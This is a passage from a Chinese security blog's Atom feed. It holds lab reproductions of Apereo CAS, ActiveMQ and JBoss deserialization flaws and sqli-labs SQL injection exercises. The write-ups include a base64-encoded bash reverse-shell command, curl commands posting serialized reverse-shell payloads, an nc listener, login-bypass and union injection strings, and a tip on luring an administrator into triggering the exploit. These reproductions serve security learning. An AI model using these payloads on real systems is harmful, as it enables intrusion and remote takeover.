+    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Apereo CAS&lt;/code&gt;是一款&lt;code&gt;Apereo&lt;/code&gt;发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。&lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;vulhub&lt;/code&gt;启动漏洞环境&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;root&amp;#x2F;vulhub&amp;#x2F;apereo-cas&amp;#x2F;4.1-rce&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;环境启动后，访问&lt;code&gt;http://your-ip:8080/cas/login&lt;/code&gt;即可查看到登录页面。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101009.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;漏洞原理是&lt;code&gt;Webflow&lt;/code&gt;中使用了默认密钥&lt;code&gt;changeit&lt;/code&gt;：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;public class EncryptedTranscoder implements Transcoder &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    private CipherBean cipherBean;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    private boolean compression &amp;#x3D; true;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    public EncryptedTranscoder() throws IOException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        BufferedBlockCipherBean bufferedBlockCipherBean &amp;#x3D; new BufferedBlockCipherBean();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&amp;quot;AES&amp;quot;, &amp;quot;CBC&amp;quot;, &amp;quot;PKCS7&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setKeyAlias(&amp;quot;aes128&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setKeyPassword(&amp;quot;changeit&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bufferedBlockCipherBean.setNonce(new RBGNonce());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        this.setCipherBean(bufferedBlockCipherBean);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#x2F;&amp;#x2F; ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="Apereo CAS" scheme="https://hzktester.top/tags/Apereo-CAS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ActiveMQ 反序列化漏洞（CVE-2015-5254）</title>
+    <link href="https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/</id>
+    <published>2020-10-10T02:32:00.000Z</published>
+    <updated>2020-10-10T02:35:29.678Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apache ActiveMQ</code>是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持<code>Java</code>消息服务、集群、<code>Spring Framework</code>等。</p><p><code>Apache ActiveMQ 5.13.0</code>之前<code>5.x</code>版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的<code>Java Message Service(JMS)ObjectMessage</code>对象利用该漏洞执行任意代码。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>运行漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;activemq&#x2F;CVE-2015-5254&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境运行后，将监听<code>61616</code>和<code>8161</code>两个端口。其中<code>61616</code>是工作端口，消息在这个端口进行传递；<code>8161</code>是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101001.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用过程如下：</p><ol><li>构造（可以使用<code>ysoserial</code>）可执行命令的序列化对象</li><li>作为一个消息，发送给目标<code>61616</code>端口</li><li>访问web管理页面，读取消息，触发漏洞</li></ol><p>使用<a href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载<code>jmet</code>的jar文件，并在同目录下创建一个<code>external</code>文件夹（否则可能会报文件夹不存在的错误）。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101002.png" alt="image"></p><p><code>jmet</code>原理是使用<code>ysoserial</code>生成<code>Payload</code>并发送（其<code>jar</code>内自带<code>ysoserial</code>，无需再自己下载），所以我们需要在<code>ysoserial</code>是<code>gadget</code>中选择一个可以使用的，比如<code>ROME</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101003.png" alt="image"></p><p>此时会给目标<code>ActiveMQ</code>添加一个名为<code>event</code>的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p><p>默认的用户名和密码为<code>admin</code>，<code>admin</code></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101004.png" alt="image"></p><p>点击这条消息即可触发命令，此时进入容器<code>docker-compose exec activemq bash</code>，可见<code>/tmp/success</code>已成功创建，说明漏洞利用成功：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101005.png" alt="image"></p><p>将命令替换成弹<code>shell</code>语句再利用：</p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">Java Runtime</a> 配合<code>bash</code>编码</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101006.png" alt="image"></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 47.101.62.20 61616</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101007.png" alt="image"></p><p>反弹shell:</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101008.png" alt="image"></p><blockquote><p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p></blockquote>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Apache ActiveMQ&lt;/code&gt;是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持&lt;code&gt;Java&lt;/code&gt;消息服务、集群、&lt;code&gt;Spring Framework&lt;/code&gt;等。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Apache ActiveMQ 5.13.0&lt;/code&gt;之前&lt;code&gt;5.x&lt;/code&gt;版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的&lt;code&gt;Java Message Service(JMS)ObjectMessage&lt;/code&gt;对象利用该漏洞执行任意代码。&lt;/p&gt;
+&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;vulhub&lt;/code&gt;运行漏洞环境&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd vulhub&amp;#x2F;activemq&amp;#x2F;CVE-2015-5254&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;环境运行后，将监听&lt;code&gt;61616&lt;/code&gt;和&lt;code&gt;8161&lt;/code&gt;两个端口。其中&lt;code&gt;61616&lt;/code&gt;是工作端口，消息在这个端口进行传递；&lt;code&gt;8161&lt;/code&gt;是Web管理页面端口。访问&lt;code&gt;http://your-ip:8161&lt;/code&gt;即可看到web管理页面，不过这个漏洞理论上是不需要web的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101001.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;漏洞利用过程如下：&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="ActiveMQ" scheme="https://hzktester.top/tags/ActiveMQ/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</title>
+    <link href="https://hzktester.top/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89/</id>
+    <published>2020-10-09T09:14:00.000Z</published>
+    <updated>2020-10-09T09:14:08.977Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>Red Hat JBoss Application Server</code>是一款基于<code>JavaEE</code>的开源应用服务器。<code>JBoss AS 4.x</code>及之前版本中，<code>JbossMQ</code>实现过程的<code>JMS over HTTP Invocation Layer</code>的<code>HTTPServerILServlet.java</code>文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，目标为<code>http://your-ip:8080</code>。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/jbossmq-httpil/HTTPServerILServlet</code></p><p>返回<code>This is the JBossMQ HTTP-IL</code>，说明页面存在，此页面存在反序列化漏洞。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100907.png" alt="image"></p><p>这里直接利用<code>CVE-2017-12149</code>生成的ser，发送到<code>/jbossmq-httpil/HTTPServerILServlet</code>接口中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100908.png" alt="image"></p><p>反弹shell：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100909.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Red Hat JBoss Application Server&lt;/code&gt;是一款基于&lt;code&gt;JavaEE&lt;/code&gt;的开源应用服务器。&lt;code&gt;JBoss AS 4.x&lt;/code&gt;及之前版本中，&lt;code&gt;JbossMQ&lt;/code&gt;实现过程的&lt;code&gt;JMS over HTTP Invocation Layer&lt;/code&gt;的&lt;code&gt;HTTPServerILServlet.java&lt;/code&gt;文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。&lt;/p&gt;
+&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;环境启动后，目标为&lt;code&gt;http://your-ip:8080&lt;/code&gt;。&lt;/p&gt;
+&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;访问&lt;code&gt;/jbossmq-httpil/HTTPServerILServlet&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;返回&lt;code&gt;This is the JBossMQ HTTP-IL&lt;/code&gt;，说明页面存在，此页面存在反序列化漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100907.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;这里直接利用&lt;code&gt;CVE-2017-12149&lt;/code&gt;生成的ser，发送到&lt;code&gt;/jbossmq-httpil/HTTPServerILServlet&lt;/code&gt;接口中&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="JBoss" scheme="https://hzktester.top/tags/JBoss/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</title>
+    <link href="https://hzktester.top/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%205.x%206.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%205.x%206.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89/</id>
+    <published>2020-10-09T08:56:00.000Z</published>
+    <updated>2020-10-09T08:56:28.708Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞为<code>Java</code>反序列化错误类型，存在于<code>Jboss</code>的<code>HttpInvoker</code>组件中的 <code>ReadOnlyAccessFilter</code>过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响5.x和6.x版本的JBOSSAS</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到<code>JBoss</code>默认页面。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100901.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/invoker/readonly</code>，返回500，说明页面存在，此页面存在反序列化漏洞。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100902.png" alt="image"></p><p>利用工具:<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>,我们选择一个<code>Gadget</code>：<code>ReverseShellCommonsCollectionsHashMap</code>，编译并生成序列化数据：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100903.png" alt="image"></p><p>生成<code>ReverseShellCommonsCollectionsHashMap.class</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure><p>生成<code>ReverseShellCommonsCollectionsHashMap.ser</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 47.101.62.20:1234（ip是nc所在的ip）</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100904.png" alt="image"></p><p>利用，监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>发送poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100905.png" alt="image"></p><p>反弹shell:</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100906.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;该漏洞为&lt;code&gt;Java&lt;/code&gt;反序列化错误类型，存在于&lt;code&gt;Jboss&lt;/code&gt;的&lt;code&gt;HttpInvoker&lt;/code&gt;组件中的 &lt;code&gt;ReadOnlyAccessFilter&lt;/code&gt;过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;漏洞影响5.x和6.x版本的JBOSSAS&lt;/p&gt;
+&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;首次执行时会有1~3分钟时间初始化，初始化完成后访问&lt;code&gt;http://your-ip:8080/&lt;/code&gt;即可看到&lt;code&gt;JBoss&lt;/code&gt;默认页面。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100901.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;访问&lt;code&gt;/invoker/readonly&lt;/code&gt;，返回500，说明页面存在，此页面存在反序列化漏洞。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="JBoss" scheme="https://hzktester.top/tags/JBoss/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs靶场Less11-16(二次注入)</title>
+    <link href="https://hzktester.top/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess11-16(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/"/>
+    <id>https://hzktester.top/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess11-16(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/</id>
+    <published>2020-10-04T15:29:00.000Z</published>
+    <updated>2020-10-04T15:32:46.844Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>这一关开始使用post注入，什么是post注入呢？</p><blockquote><p> 就是数据从客户端提交<br>到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，<br>提交到服务器后服务器再进行验证。这就是一次 post 的过程的。</p></blockquote><p>当我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100404.png" alt="image"></p><p>显示错误了，可以从错误中分析到程序对参数进行单引号的处理。<br>这里我们可以在输入框输入万能密码来尝试一下。</p><p>这里<code>username</code>输入：<code>admin&#39;or&#39;1&#39;=&#39;1#</code>，密码随意</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100405.png" alt="image"></p><p>返回的正确的结果，那么原因是什么呢？我们在<code>background-1</code>中已经其实提到了，逻辑运算的部分中已经讲解了原理。</p><p>当我们提交<code>username</code>和<code>password</code>后，后台形成的<code>sql</code>语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;or&#39;1&#39;&#x3D;&#39;1# and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><blockquote><p>在#以后的内容就被注释掉，前面的内容因为or 1=1恒成立，所以语句就成立，我们此时以admin的用户登录。那么接下来我们尝试用get注入中用到的其他的语句代替or 1=1进行注入。</p></blockquote><p>这里我们用 union 注入进行尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：1admin&#39;union select 1,database()#</span><br><span class="line">passwd&#x3D;1（任意密码）</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100406.png" alt="image"></p><p>可以看到显示了<code>database</code>为<code>security</code>，这是我们比较常用的手法。<br>还可以利用其他的方法进行注入</p><h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><p>本关于11不同之处在于，id参数使用了”)过滤。</p><figure class="highlight 